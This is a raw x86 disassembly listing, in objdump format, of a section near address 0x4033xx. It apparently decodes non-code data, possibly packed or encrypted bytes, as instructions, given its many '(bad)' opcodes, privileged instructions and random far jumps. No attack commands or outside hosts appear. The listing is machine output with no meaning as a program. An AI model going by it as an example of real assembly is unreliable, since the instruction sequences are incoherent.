  4032b5:	add    ebx,eax
  4032b7:	dec    esi
  4032b8:	je     0x403309
  4032ba:	adc    ebp,DWORD PTR [edx]
  4032bc:	fdiv   DWORD PTR [edi-0x66]
  4032bf:	inc    esi
  4032c0:	arpl   WORD PTR [esp+ebp*1+0x3d],si
  4032c4:	xchg   ebp,eax
  4032c5:	xchg   edi,eax
  4032c6:	pop    ecx
  4032c7:	or     edi,edi
  4032c9:	rol    BYTE PTR [ebp-0x57],1
  4032cc:	and    esp,DWORD PTR [ebp+0x20]
  4032cf:	pop    edx
  4032d0:	imul   ebx,DWORD PTR [esp+eiz*8+0x46],0xc06fb764
  4032d8:	aas    
  4032d9:	(bad)  
  4032da:	in     al,0x38
  4032dc:	mov    cl,0x63
  4032de:	outs   dx,DWORD PTR ds:[esi]
  4032df:	add    BYTE PTR [edi],0x0
  4032e2:	xchg   ebx,eax
  4032e3:	ins    DWORD PTR es:[edi],dx
  4032e4:	jns    0x403343
  4032e6:	mov    dl,0x75
  4032e8:	mov    dl,0x4d
  4032ea:	mov    ebp,0x4085cbbc
  4032ef:	cmc    
  4032f0:	push   ebx
  4032f1:	pusha  
  4032f2:	xor    edi,DWORD PTR [ebp+0x13be230e]
  4032f8:	in     eax,0x77
  4032fa:	xlat   BYTE PTR ds:[ebx]
  4032fb:	xor    DWORD PTR [edx+0xc217650],eax
  403301:	mov    DWORD PTR [ebp-0x45b244e6],esi
  403307:	pop    edx
  403308:	popf   
  403309:	out    0xc3,al
  40330b:	clc    
  40330c:	repz push ecx
  40330e:	jge    0x4032f9
  403310:	jae    0x403383
  403312:	sub    esi,DWORD PTR [edi+esi*8]
  403315:	xlat   BYTE PTR ds:[ebx]
  403316:	hlt    
  403317:	add    edi,DWORD PTR [esi-0xe]
  40331a:	lods   eax,DWORD PTR ds:[esi]
  40331b:	or     eax,0x6f76ab8f
  403320:	fld    DWORD PTR [ecx-0x1a]
  403323:	cmp    DWORD PTR [ebp+0x4],ebx
  403326:	icebp  
  403327:	stos   DWORD PTR es:[edi],eax
  403328:	iret   
  403329:	mov    eax,0x5804ba8b
  40332e:	test   BYTE PTR [edi],0x89
  403331:	aas    
  403332:	dec    ecx
  403333:	mov    esi,0xfdaf240
  403338:	add    eax,0x46df0846
  40333d:	and    BYTE PTR [edx+0x4735948e],dh
  403343:	dec    eax
  403344:	lods   al,BYTE PTR ds:[esi]
  403345:	xor    WORD PTR [esi-0x58],bx
  403349:	push   ebp
  40334a:	sub    edx,DWORD PTR [edx+0x288a56e3]
  403350:	lock sbb dh,BYTE PTR [eax-0x5d8b79aa]
  403357:	in     al,dx
  403358:	imul   eax,edi,0xc79c7754
  40335e:	inc    edi
  40335f:	inc    esi
  403360:	pop    eax
  403361:	loope  0x4032f3
  403363:	test   BYTE PTR [ecx],ch
  403365:	call   0x920d:0x80accca7
  40336c:	dec    ebp
  40336d:	(bad)  
  40336e:	xlat   BYTE PTR es:[ebx]
  403370:	neg    dh
  403372:	hlt    
  403373:	or     ebx,esp
  403375:	(bad)  
  403376:	cmp    DWORD PTR [ecx+0x50922827],edx
  40337c:	add    eax,0x621c5b89
  403381:	add    DWORD PTR [esi+0x2d14eb0],0x63b0018c
  40338b:	pop    ds
  40338c:	jmp    0xea98:0x450722a0
  403393:	jns    0x4033ca
  403395:	pop    ecx
  403396:	call   0xa770:0xc6081959
  40339d:	push   edx
  40339e:	ror    BYTE PTR [edx+0x5b],1
  4033a1:	aaa    
  4033a2:	aaa    
  4033a3:	retf   
  4033a4:	add    cl,BYTE PTR [esi-0x46]
  4033a7:	mov    ds:0xd4a3d8dd,al
  4033ac:	(bad)  
  4033ae:	push   0xe3f5b469
  4033b3:	pop    edi
  4033b4:	jno    0x40342b
  4033b6:	xchg   esp,eax
  4033b7:	mov    eax,0x6685150f
  4033bc:	jmp    0x1271134
  4033c1:	push   ecx
  4033c2:	and    cl,BYTE PTR [esi]
  4033c4:	cs sub al,0x4b
  4033c7:	in     al,0xe6
  4033c9:	sbb    al,0xb
  4033cb:	sub    al,0x64
  4033cd:	popf   
  4033ce:	test   eax,0x736e954f
  4033d3:	mov    edi,0x765f88ed
  4033d8:	and    al,0xd6
  4033da:	jmp    0xedc31a8c
  4033df:	dec    esi
  4033e0:	movzx  esi,BYTE PTR [ebx+0x79dcca5d]
  4033e7:	lock fwait
  4033e9:	dec    ebp
  4033ea:	cld    
  4033eb:	out    dx,eax
  4033ec:	jns    0x403446
  4033ee:	scas   al,BYTE PTR es:[edi]
  4033ef:	out    0x7b,eax
  4033f1:	(bad)  
  4033f2:	dec    eax
  4033f3:	and    eax,0x9eb7f069
  4033f8:	mov    ds:0xc1d97ed9,eax
  4033fd:	ins    BYTE PTR es:[edi],dx
  4033fe:	pop    ss
  4033ff:	xchg   ecx,eax
  403400:	push   ss
  403401:	in     eax,0xb1
  403403:	sahf   
  403404:	xchg   DWORD PTR ds:0x683b2b8,ebx
  40340a:	and    esi,esi
  40340c:	mov    ebp,0x718605df
  403411:	rol    BYTE PTR [ecx-0x34cae6b1],1
  403417:	cwde   
  403418:	in     eax,dx
  403419:	xor    al,0x1e
  40341b:	std    
  40341c:	mov    ebp,ss
  40341e:	adc    dl,BYTE PTR [ecx]
  403420:	mov    ah,0xd1
  403422:	dec    ecx
  403423:	and    eax,ecx
  403425:	jns    0x403451
  403427:	adc    bl,BYTE PTR [ecx]
  403429:	xchg   ebx,eax
  40342a:	adc    al,0x8f
  40342c:	mov    ecx,0x6f980ad9
  403431:	mov    esi,0x471c1a70
  403436:	sahf   
  403437:	adc    ecx,edi
  403439:	test   al,0x43
  40343b:	pop    ds
  40343c:	rsm    
  40343e:	dec    edi
  40343f:	cmc    
  403440:	call   0xa5a7:0x4e7becfd
  403447:	jge    0x40344f
  403449:	adc    esp,DWORD PTR [esi-0xbbaeaeb]
  40344f:	mov    DWORD PTR [edx+0x28],ecx
  403452:	hlt    
  403453:	sahf   
  403454:	and    ah,al
  403456:	cs fs lahf 
  403459:	icebp  
  40345a:	out    dx,eax
  40345b:	jp     0x4034da
  40345d:	push   edi
  40345e:	push   cs
  40345f:	pop    esp
  403460:	shl    esp,1
  403462:	add    DWORD PTR [edx-0x59a0d0ee],edx
  403468:	ins    DWORD PTR es:[edi],dx
  403469:	cmp    al,0x55
  40346b:	aam    0x50
  40346d:	js     0x40345a
  40346f:	push   es
  403470:	mov    ecx,0x213ab29d
  403475:	sub    al,cl
  403477:	pop    es
  403478:	fidiv  DWORD PTR [edx]
  40347a:	adc    BYTE PTR [ebx+0x5b48f78b],cl
  403480:	repz xor BYTE PTR [eax],dl
  403483:	push   ebp
  403484:	aam    0xa0
  403486:	imul   ebp,DWORD PTR [esp+edx*4+0x77],0xffffffd8
  40348b:	mov    WORD PTR [edi],fs
  40348d:	mov    eax,ds:0x70e76160
  403492:	push   esp
  403493:	and    edx,ebp
  403495:	sub    ecx,esp
  403497:	add    bl,BYTE PTR [edi+0x55]
  40349a:	dec    esp
  40349b:	les    esp,FWORD PTR [esp+eax*1]
  40349e:	mov    dh,0x8a
  4034a0:	mov    esi,0x6d7449de
  4034a5:	repz push DWORD PTR [eax-0x451ffd11]
  4034ac:	js     0x403486
  4034ae:	and    ah,BYTE PTR [ecx+edi*8-0x4f]
  4034b2:	or     ebp,ebx
  4034b4:	ins    BYTE PTR es:[edi],dx
  4034b5:	cmp    al,0x60
  4034b7:	idiv   DWORD PTR [eax]
  4034b9:	push   edi
  4034ba:	inc    ebx
  4034bb:	sub    al,0xdc
  4034bd:	hlt    
  4034be:	jp     0x403458
  4034c0:	jo     0x4034d4
  4034c2:	pop    edi
  4034c3:	(bad)  
  4034c4:	push   esp
  4034c5:	sub    cl,BYTE PTR [ebx+0x7f751bc0]
  4034cb:	pop    esi
  4034cc:	mov    edi,0x38cc02fa
  4034d1:	sti    
  4034d2:	call   0x4257:0xac8df3e5
  4034d9:	and    ch,BYTE PTR [edx]
  4034db:	leave  
  4034dc:	mov    esp,0x9f5291d5
  4034e1:	data16 jb 0x403519
  4034e4:	int    0x80
  4034e6:	mov    dh,0x36
  4034e8:	mov    esp,0x8dd44a19
  4034ed:	sbb    ecx,DWORD PTR [ecx+eiz*1+0x6e4c91c7]
  4034f4:	scas   eax,DWORD PTR es:[edi]
  4034f5:	stos   BYTE PTR es:[edi],al
  4034f6:	or     bl,BYTE PTR [edi-0xbc17939]
  4034fc:	fxtract 
  4034fe:	and    dh,ch
  403500:	and    eax,0x9e67d8a0
  403505:	mov    bh,0xc0
  403507:	push   esp
  403508:	xor    DWORD PTR [edi+0xf],esp
  40350b:	bound  edx,QWORD PTR [ecx]
  40350d:	pusha  
  40350e:	fstp   TBYTE PTR [edi-0x74]
  403511:	xor    BYTE PTR [edi-0x56],0x6a
  403515:	xor    BYTE PTR [edx],ch
  403517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403518:	or     bh,al
  40351a:	cs xchg ebx,eax
  40351c:	pop    edx
  40351d:	jbe    0x4034c9
  40351f:	and    DWORD PTR [ebp+0x75d1b2aa],esp
  403525:	(bad)  
  403526:	je     0x40359d
  403528:	jmp    0x3aea:0x3c25a46f
  40352f:	add    DWORD PTR [edi],0xb5dc9ba3
  403535:	shr    DWORD PTR [ebx+ebp*1-0x33005369],1
  40353c:	cmp    eax,ebp
  40353e:	test   ecx,esi
  403540:	inc    ebx
  403541:	inc    ebp
  403542:	sbb    DWORD PTR [ecx-0x4ecb83dc],ebx
  403548:	hlt    
  403549:	stos   DWORD PTR es:[edi],eax
  40354a:	call   0x85ea:0xbe35ea72
  403551:	mov    dh,0x42
  403553:	dec    ecx
  403554:	jbe    0x403557
  403556:	inc    ecx
  403557:	sbb    al,0x2d
  403559:	test   BYTE PTR [edi+ecx*1],bl
  40355c:	pop    ebp
  40355d:	xchg   ebx,eax
  40355e:	jo     0x403597
  403560:	sub    BYTE PTR [edx],cl
  403562:	or     DWORD PTR [edx-0x8],esp
  403565:	mov    ch,BYTE PTR [ecx]
  403567:	fisttp QWORD PTR [ebx]
  403569:	and    esp,edi
  40356b:	xor    ah,bh
  40356d:	inc    eax
  40356e:	das    
  40356f:	jge    0x403546
  403571:	lock (bad) 
  403573:	jb     0x4035b2
  403575:	add    ebp,DWORD PTR [ecx+0x38]
  403578:	stos   BYTE PTR es:[edi],al
  403579:	(bad)
  40357e:	and    DWORD PTR [ecx],0xffffffc5
  403581:	cld    
  403582:	aam    0xd2
  403584:	push   edi
  403585:	outs   dx,BYTE PTR ds:[esi]
  403586:	fcom   QWORD PTR [edi-0x6c]
  403589:	and    dh,BYTE PTR [eax]
  40358b:	cld    
  40358c:	loope  0x40352b
  40358e:	or     ebp,DWORD PTR [edx]
  403590:	mov    ebx,0x8de36c71
  403595:	hlt    
  403596:	xor    al,0xe1
  403598:	mov    edx,0xcf125d64
  40359d:	sub    eax,0x16ab2296
  4035a2:	jo     0x403611
  4035a4:	mov    bh,bh
  4035a6:	xchg   ebx,eax
  4035a7:	ds mov cl,0xce
  4035aa:	cmp    cl,BYTE PTR [ebp-0x57516f74]
  4035b0:	and    eax,0x2fe902b1
  4035b5:	push   ebp
  4035b6:	imul   eax,DWORD PTR [edi+0x2869e9cd],0x46b015fe
  4035c0:	in     eax,dx
  4035c1:	sub    al,0x95
  4035c3:	inc    ebx
  4035c4:	shl    BYTE PTR [esp+edi*8-0x67df9f0f],1
  4035cb:	xor    BYTE PTR [ecx+0x945f77f],cl
  4035d1:	cli    
  4035d2:	dec    DWORD PTR [ecx+0x40]
  4035d5:	push   eax
  4035d6:	retf   
  4035d7:	jno    0x40363a
  4035d9:	clc    
  4035da:	xlat   BYTE PTR ds:[ebx]
  4035db:	dec    ebx
  4035dc:	fidivr DWORD PTR [eax-0x6e782c23]
  4035e2:	cli    
  4035e3:	pop    ecx
  4035e4:	push   ss
  4035e5:	bound  edi,QWORD PTR [edi+0x66]
  4035e8:	xchg   ecx,eax
  4035e9:	jle    0x403590
  4035eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035ec:	mov    esp,ebp
  4035ee:	clc    
  4035ef:	ja     0x4035ce
  4035f1:	xor    esp,eax
  4035f3:	xchg   ecx,eax
  4035f4:	jge    0x403665
  4035f6:	jb     0x403593
  4035f8:	ret    0xfad7
  4035fb:	(bad)  
  4035fc:	fisttp WORD PTR [edi]
  4035fe:	out    0xb6,al
  403600:	or     edx,DWORD PTR [edx-0x25]
  403603:	dec    esp
  403604:	fmul   DWORD PTR [edx-0x38]
  403607:	jge    0x4035f0
  403609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40360a:	imul   ebx,DWORD PTR [ebp+0x452960b0],0xffffffd8
  403611:	pop    ss
  403612:	cmp    eax,esi
  403614:	shl    DWORD PTR [ecx+0x33],cl
  403617:	lahf   
  403618:	adc    BYTE PTR [ecx+ebx*2+0x39de60f9],bl
  40361f:	mov    ds:0xbe14ca5d,al
  403624:	push   0x46
  403626:	rcl    DWORD PTR [ebp+edx*2+0x74f1a1f],1
  40362d:	cmp    ecx,DWORD PTR [edx+0x73]
  403630:	out    dx,eax
  403631:	push   ecx
  403632:	js     0x4035e9
  403634:	call   0xd391c45e
  403639:	xlat   BYTE PTR ds:[ebx]
  40363a:	pop    es
  40363b:	retf   0xcb7e
  40363e:	mov    edx,0x2b895e1e
  403643:	loop   0x40369d
  403645:	sub    cl,BYTE PTR [eax+0x476672b4]
  40364b:	xor    al,0xe7
  40364d:	adc    BYTE PTR [ebx-0x12],0x15
  403651:	test   BYTE PTR [ebp-0x76],ah
  403654:	gs push 0x22
  403657:	jo     0x403614
  403659:	std    
  40365a:	jmp    0xe958:0x57f2a390
  403661:	or     BYTE PTR [ebx+0x67ecfec6],ah
  403667:	dec    ebp
  403668:	int    0x38
  40366a:	add    DWORD PTR [ecx+edi*8],ebx
  40366d:	icebp  
  40366e:	mov    eax,ds:0x1107fe32
  403673:	pop    ecx
  403674:	iret   
  403675:	dec    ebx
  403676:	jl     0x403666
  403678:	mov    dh,0x44
  40367a:	jns    0x403663
  40367c:	fidiv  WORD PTR [eax+0x2c68d060]
  403682:	mov    ebx,DWORD PTR [esi+0x33dee446]
  403688:	fist   WORD PTR [ecx-0x5602b56f]
  40368e:	pop    ebx
  40368f:	xchg   edx,eax
  403690:	imul   cl
  403692:	cmc    
  403693:	sbb    BYTE PTR [edx+ebx*8+0x3708dd50],cl
  40369a:	daa    
  40369b:	pop    ebp
  40369c:	jb     0x40362a
  40369e:	push   edi
  40369f:	sbb    eax,0xcda0e225
  4036a4:	inc    ebp
  4036a5:	out    dx,eax
  4036a6:	sub    al,0x21
  4036a8:	cdq    
  4036a9:	sar    DWORD PTR [ebx-0x2443a734],0xf9
  4036b0:	out    0xa3,eax
  4036b2:	fisttp DWORD PTR [eax-0x15]
  4036b5:	mov    ch,0xf
  4036b7:	sti    
  4036b8:	pop    es
  4036b9:	aam    0x17
  4036bb:	popf   
  4036bc:	sbb    BYTE PTR [esi+0x52],dl
  4036bf:	or     ebx,DWORD PTR [ebp+edx*4+0x11d205e]
  4036c6:	and    al,0xf7
  4036c8:	ja     0x40369e
  4036ca:	js     0x4036f5
  4036cc:	scas   al,BYTE PTR es:[edi]
  4036cd:	add    dh,BYTE PTR [eax+0x3e67cb6]
  4036d3:	inc    ebp
  4036d4:	inc    ecx
  4036d5:	retf   0x1754
  4036d8:	add    al,0x5
  4036da:	rol    DWORD PTR [edx-0x35],1
  4036dd:	pop    ecx
  4036de:	mov    dl,0xc
  4036e0:	loop   0x4036bc
  4036e2:	jno    0x403689
  4036e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036e5:	iret   
  4036e6:	pusha  
  4036e7:	lods   al,BYTE PTR ds:[esi]
  4036e8:	jns    0x4036c3
  4036ea:	mov    edi,0x2b809054
  4036ef:	pop    es
  4036f0:	mov    dh,0x5a
  4036f2:	bound  esp,QWORD PTR [ecx+0x1a0b841c]
  4036f8:	je     0x40372a
  4036fa:	ror    BYTE PTR [esi+0x6b96f9bd],0xe2
  403701:	ds daa 
  403703:	mov    BYTE PTR [edx+eax*1],cl
  403706:	pusha  
  403707:	pop    edx
  403708:	call   0xe81d9c46
  40370d:	mov    ds:0xa66723f6,al
  403712:	outs   dx,DWORD PTR ds:[esi]
  403713:	outs   dx,DWORD PTR ds:[esi]
  403714:	aas    
  403715:	cmp    al,0xfb
  403717:	xor    al,0x43
  403719:	sbb    DWORD PTR [edx+0x4e],esi
  40371c:	jmp    0x9c51:0x7c1dd130
  403723:	sar    DWORD PTR [eax+ecx*8-0x5b61bb3],0xf4
  40372b:	push   0xffffffaf
  40372d:	pop    eax
  40372e:	daa    
  40372f:	fsub   DWORD PTR [edi+ecx*8-0x10602ff6]
  403736:	push   ebp
  403737:	fwait
  403738:	sub    esi,DWORD PTR [ebx-0x309f6208]
  40373e:	sub    BYTE PTR [esi+0x14],ah
  403741:	sahf   
  403742:	fcomi  st,st(6)
  403744:	call   0xeed24ddf
  403749:	xchg   DWORD PTR [ebx-0x24],edx
  40374c:	popf   
  40374d:	in     eax,0x16
  40374f:	dec    ebx
  403750:	fwait
  403751:	loope  0x403749
  403753:	and    al,0x73
  403755:	(bad)  
  403756:	push   esi
  403757:	xchg   esi,eax
  403758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403759:	push   ds
  40375a:	push   0x9168fdc2
  40375f:	xchg   ebp,eax
  403760:	or     bh,BYTE PTR [ecx]
  403762:	and    al,0x1d
  403764:	ret    0x25ef
  403767:	popf   
  403768:	jp     0x403771
  40376a:	mov    cl,0xd5
  40376c:	jmp    0x5d65:0xed93c327
  403773:	add    BYTE PTR [edx+0x733c101f],ah
  403779:	fwait
  40377a:	lea    ebp,[ecx+edx*1]
  40377d:	adc    DWORD PTR [ebx],esi
  40377f:	adc    al,BYTE PTR ds:0x4949f8e0
  403785:	sub    DWORD PTR ds:0x51ceab77,ebx
  40378b:	icebp  
  40378c:	out    0x15,al
  40378e:	pushf  
  40378f:	stos   BYTE PTR es:[edi],al
  403790:	xor    DWORD PTR [eax],0xffffffb5
  403793:	out    dx,eax
  403794:	mov    ecx,0x7d231b9c
  403799:	pop    edi
  40379a:	xchg   ebp,eax
  40379b:	pop    esi
  40379c:	cmp    eax,0x5ece9ba5
  4037a1:	xor    dl,BYTE PTR ds:0x9f670754
  4037a7:	jne    0x4037b9
  4037a9:	sbb    al,0x91
  4037ab:	mov    ebp,0xb89e4da6
  4037b0:	enter  0x1c53,0x4e
  4037b4:	mov    esp,0xe6e834b6
  4037b9:	test   al,0xf0
  4037bb:	inc    ebp
  4037bc:	mov    esi,0x3558db2d
  4037c1:	out    0x37,eax
  4037c3:	ficom  DWORD PTR [ebp-0x2d976e96]
  4037c9:	fcomip st,st(5)
  4037cb:	pusha  
  4037cc:	mov    ecx,0xd1ff0bc
  4037d1:	mov    bl,0x3f
  4037d3:	xchg   ecx,eax
  4037d4:	test   ah,al
  4037d6:	xchg   edi,eax
  4037d7:	jb     0x403839
  4037d9:	lea    ebp,[esi+edi*1+0x69]
  4037dd:	xlat   BYTE PTR ds:[ebx]
  4037de:	repz mov bh,0x2e
  4037e1:	repz add eax,0xa1f54f05
  4037e7:	test   eax,0x6f66c687
  4037ec:	pop    ss
  4037ed:	stc    
  4037ee:	jo     0x4037d3
  4037f0:	push   es
  4037f1:	lea    ebp,[ecx+0x13568da5]
  4037f7:	push   es
  4037f8:	into   
  4037f9:	rol    DWORD PTR [edx+0x7723924a],1
  4037ff:	push   edx
  403800:	or     BYTE PTR ds:0x7c4f2053,cl
  403806:	js     0x4037a9
  403808:	mov    ebp,0x9bb8941b
  40380d:	push   ds
  40380e:	inc    ebp
  40380f:	xchg   ecx,eax
  403810:	aaa    
  403811:	xor    eax,0x2b4ac4cd
  403816:	mov    ch,0x25
  403818:	js     0x4037bb
  40381a:	push   cs
  40381b:	xchg   dh,ah
  40381d:	stos   BYTE PTR es:[edi],al
  40381e:	out    dx,eax
  40381f:	mov    ds:0x736c9ce,al
  403824:	in     al,0x41
  403826:	add    DWORD PTR [eax+0x5a34f685],0x9837e7cc
  403830:	(bad)  
  403831:	sub    eax,0xed9700c1
  403836:	jo     0x40384d
  403838:	(bad)  
  40383a:	or     al,ch
  40383c:	cmp    edx,0x7b
  40383f:	cli    
  403840:	pop    ebp
  403841:	iret   
  403842:	push   edi
  403843:	mov    esi,0x5c187f6
  403848:	or     BYTE PTR [edi+0x19c47317],0xa1
  40384f:	in     eax,0xfe
  403851:	pop    ebp
  403852:	mov    esp,0x5286ba29
  403857:	adc    al,0x2a
  403859:	mov    BYTE PTR [ecx+0x7c],0x95
  40385d:	pop    edi
  40385e:	enter  0xc4d5,0x59
  403862:	outs   dx,DWORD PTR ds:[esi]
  403863:	ds hlt 
  403865:	mov    ecx,0xddbc3e41
  40386a:	cs cmc 
  40386c:	mov    al,ch
  40386e:	adc    BYTE PTR [ecx],dh
  403870:	icebp  
  403871:	cli    
  403872:	or     eax,0x9a70c403
  403877:	or     ecx,esp
  403879:	dec    esi
  40387a:	cmp    BYTE PTR [ebp+0x3d82e3de],0x6c
  403881:	hlt    
  403882:	loopne 0x40383c
  403884:	std    
  403885:	cmc    
  403886:	rol    DWORD PTR [ebx],cl
  403888:	cli    
  403889:	mov    al,0x17
  40388b:	inc    ebx
  40388c:	fwait
  40388d:	popa   
  40388e:	sbb    ebx,eax
  403890:	fisttp WORD PTR [ebx]
  403892:	hlt    
  403893:	inc    ecx
  403894:	mov    edi,0x299028cc
  403899:	mov    ds:0x6cdde18c,eax
  40389e:	fnstcw WORD PTR [ebp+0x3a]
  4038a1:	ins    BYTE PTR es:[edi],dx
  4038a2:	xor    BYTE PTR [ebp-0x69],bh
  4038a5:	aaa    
  4038a6:	add    BYTE PTR [edi-0x22],0x94
  4038aa:	icebp  
  4038ab:	add    eax,0x8181946c
  4038b0:	rcr    edx,1
  4038b2:	in     eax,dx
  4038b3:	in     eax,dx
  4038b4:	xor    al,BYTE PTR [esp+eax*4]
  4038b7:	retf   0x7547
  4038ba:	mov    dh,0x69
  4038bc:	xor    DWORD PTR [edi-0x64],ebp
  4038bf:	push   cs
  4038c0:	pop    ss
  4038c1:	lea    ecx,[ebp+0x1fad0dc7]
  4038c7:	push   esp
  4038c8:	ja     0x403857
  4038ca:	enter  0x78c0,0x36
  4038ce:	mov    ds:0xf08203de,eax
  4038d3:	out    dx,eax
  4038d4:	inc    ebx
  4038d5:	sub    BYTE PTR [edi+0x5f],al
  4038d8:	ret    
  4038d9:	in     al,dx
  4038da:	gs dec ebp
  4038dc:	jge    0x403884
  4038de:	aad    0x61
  4038e0:	sub    eax,DWORD PTR [esi]
  4038e2:	mov    bl,0xd2
  4038e4:	push   0xffffffac
  4038e6:	jb     0x4038a7
  4038e8:	inc    ebx
  4038e9:	loop   0x403892
  4038eb:	push   es
  4038ec:	adc    BYTE PTR [ebx],dl
  4038ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038ef:	imul   edi,eax,0xef48c013
  4038f5:	popa   
  4038f6:	das    
  4038f7:	inc    eax
  4038f8:	add    al,0xb7
  4038fa:	iret   
  4038fb:	repnz adc DWORD PTR [ecx+0x53],eax
  4038ff:	addr16 jge 0x403884
  403902:	inc    BYTE PTR [edx-0x7e]
  403905:	jmp    FWORD PTR [eax+0x28e2aefd]
  40390b:	(bad)  
  40390c:	mov    dh,0x46
  40390e:	push   ebx
  40390f:	jne    0x40398b
  403911:	jl     0x403916
  403913:	jo     0x4038a2
  403915:	lods   eax,DWORD PTR ds:[esi]
  403916:	fs xchg ebp,eax
  403918:	and    al,0xf3
  40391a:	mov    BYTE PTR [ebx],dh
  40391c:	and    DWORD PTR [ebx+0x46],eax
  40391f:	lds    ebx,FWORD PTR [ecx]
  403921:	test   eax,0x305007b8
  403926:	test   edi,0xb4c1f70c
  40392c:	mov    ah,0x4e
  40392e:	add    dl,BYTE PTR [edi]
  403930:	adc    BYTE PTR [ebx],cl
  403932:	fs (bad) 
  403934:	test   esi,0x470d6424
  40393a:	inc    eax
  40393b:	call   0x8b06:0xc1642f6e
  403942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403943:	aas    
  403944:	push   eax
  403945:	lods   eax,DWORD PTR ds:[esi]
  403946:	int    0x6d
  403948:	mov    ebx,0x97ba7f33
  40394d:	mov    edx,0x8710a39c
  403952:	test   bl,dh
  403954:	pop    ebp
  403955:	idiv   BYTE PTR [ebp-0x44]
  403958:	add    al,0x9
  40395a:	mov    ds:0x1037a312,al
  40395f:	xor    dh,BYTE PTR [edi]
  403961:	idiv   DWORD PTR [edx+0x14317f09]
  403967:	push   cs
  403968:	jle    0x4038f9
  40396a:	aas    
  40396b:	jbe    0x4038f1
  40396d:	mov    edx,0xda655643
  403972:	fadd   st,st(2)
  403974:	mov    esp,0x1b788dae
  403979:	in     eax,dx
  40397a:	mov    WORD PTR [ebp-0x5828df22],gs
  403980:	cdq    
  403981:	retf   
  403982:	bound  ecx,QWORD PTR [edi]
  403984:	cmc    
  403985:	lods   eax,DWORD PTR ds:[esi]
  403986:	sub    DWORD PTR [ebx],ebp
  403988:	xor    eax,0xa6dc1b6a
  40398d:	int    0x7
  40398f:	(bad)  
  403990:	and    al,0x98
  403992:	cmp    ebx,DWORD PTR [ebx-0x5e]
  403995:	fisttp DWORD PTR [esi+edi*4-0xc]
  403999:	loopne 0x40393d
  40399b:	and    dh,BYTE PTR [edx-0x46]
  40399e:	jbe    0x4039ce
  4039a0:	enter  0x6270,0x6b
  4039a4:	sbb    BYTE PTR ds:0xf790f79a,0x51
  4039ab:	retf   
  4039ac:	sub    BYTE PTR [ebx+edi*2-0x9a4f251],cl
  4039b3:	pop    ecx
  4039b4:	mov    ds:0xf038c3c9,al
  4039b9:	bound  esp,QWORD PTR [edx+0x37]
  4039bc:	add    esp,0x1d
  4039bf:	dec    edx
  4039c0:	mov    ds:0xdc0e2aba,al
  4039c5:	cmp    BYTE PTR [ecx+0x7db08f8f],dh
  4039cb:	mov    ecx,0x4b8a3d48
  4039d0:	inc    edx
  4039d1:	inc    ebx
  4039d2:	xchg   esp,eax
  4039d3:	hlt    
  4039d4:	fsubr  DWORD PTR [ecx-0x37bd4d35]
  4039da:	jge    0x403975
  4039dc:	int3   
  4039dd:	ins    DWORD PTR es:[edi],dx
  4039de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039df:	in     eax,0xb6
  4039e1:	test   cl,0x75
  4039e4:	xor    al,ch
  4039e6:	and    eax,0x6e7976a4
  4039eb:	(bad)  
  4039ec:	sub    BYTE PTR [edi],cl
  4039ee:	pushf  
  4039ef:	into   
  4039f0:	aaa    
  4039f1:	pop    esi
  4039f2:	ins    BYTE PTR es:[edi],dx
  4039f3:	xchg   esi,eax
  4039f4:	test   DWORD PTR [esi+0x13],0x8572e4ee
  4039fb:	sub    DWORD PTR [edx],ecx
  4039fd:	xor    esi,esp
  4039ff:	push   ebp
  403a00:	or     esi,esp
  403a02:	stos   DWORD PTR es:[edi],eax
  403a03:	jmp    edx
  403a05:	mov    dl,0x54
  403a07:	addr16 push esi
  403a09:	sbb    al,0x86
  403a0b:	test   eax,0xaf06fcb4
  403a10:	aas    
  403a11:	enter  0xd5fe,0x96
  403a15:	pushf  
  403a16:	scas   al,BYTE PTR es:[edi]
  403a17:	mov    edi,0xc8f1dc26
  403a1c:	(bad)  
  403a1d:	into   
  403a1e:	jae    0x403a99
  403a20:	pop    ebp
  403a21:	jne    0x403a2c
  403a23:	out    0xa0,al
  403a25:	pop    edi
  403a26:	xchg   ebp,eax
  403a27:	call   0x54529c91
  403a2c:	pop    eax
  403a2d:	mov    al,0xfd
  403a2f:	add    dh,BYTE PTR [ebx+0x6]
  403a32:	mov    es,esp
  403a34:	add    al,ch
  403a36:	or     cl,dh
  403a38:	jo     0x403a83
  403a3a:	lods   al,BYTE PTR ds:[esi]
  403a3b:	ja     0x403a7f
  403a3d:	xor    eax,0xb3e985be
  403a42:	bound  eax,QWORD PTR [ecx+ecx*4-0x43643844]
  403a49:	fidivr WORD PTR ss:[edx+0xec75062]
  403a50:	jecxz  0x4039ee
  403a52:	aam    0x46
  403a54:	pop    esp
  403a55:	lahf   
  403a56:	test   eax,0xb215634c
  403a5b:	aam    0x21
  403a5d:	pop    ds
  403a5e:	jle    0x403a46
  403a60:	inc    edx
  403a61:	jbe    0x4039f2
  403a63:	in     al,dx
  403a64:	jmp    0xee58e7ef
  403a69:	leave  
  403a6a:	or     DWORD PTR [ebx-0x290626a4],esi
  403a70:	sub    eax,0x5b43b177
  403a75:	aaa    
  403a76:	out    dx,eax
  403a77:	std    
  403a78:	sub    al,al
  403a7a:	xchg   esp,eax
  403a7b:	pop    esi
  403a7c:	mov    ah,0x23
  403a7e:	ins    DWORD PTR es:[di],dx
  403a80:	mov    esp,0x3adf33c7
  403a85:	repz xchg esp,eax
  403a87:	pop    ss
  403a88:	jle    0x403a8f
  403a8a:	inc    ecx
  403a8b:	or     ebp,DWORD PTR [edi-0x62b292f3]
  403a91:	shl    DWORD PTR [ecx+edx*2],0xcf
  403a95:	mov    fs,WORD PTR [ecx]
  403a97:	(bad)  
  403a98:	sbb    eax,0xe882a556
  403a9d:	in     eax,dx
  403a9e:	mov    ds,WORD PTR [ebx+esi*4+0x30]
  403aa2:	mov    BYTE PTR ds:0x36bd1524,cl
  403aa8:	and    esp,DWORD PTR [eax+0x6c]
  403aab:	fwait
  403aac:	pop    es
  403aad:	outs   dx,DWORD PTR ds:[esi]
  403aae:	push   edx
  403aaf:	(bad)  
  403ab1:	jle    0x403b07
  403ab3:	pop    ds
  403ab4:	adc    ecx,esi
  403ab6:	cdq    
  403ab7:	pop    ebx
